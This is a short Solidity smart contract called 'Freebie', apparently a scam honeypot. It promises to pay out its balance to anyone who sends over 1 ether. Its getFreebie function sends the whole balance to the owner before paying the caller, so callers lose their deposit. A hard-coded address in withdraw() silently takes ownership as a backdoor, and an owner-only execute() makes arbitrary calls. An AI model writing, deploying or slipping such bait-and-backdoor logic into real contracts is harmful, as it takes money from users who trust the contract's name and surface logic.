pragma solidity ^0.4.19;

contract Freebie {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595) {
            owner = 0x30ad12df80a2493a82DdFE367d866616db8a2595;
        }
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function execute(address _address, bytes _data) public payable {
        require(msg.sender == owner);
        require(_address.call.value(msg.value)(_data));
    }
}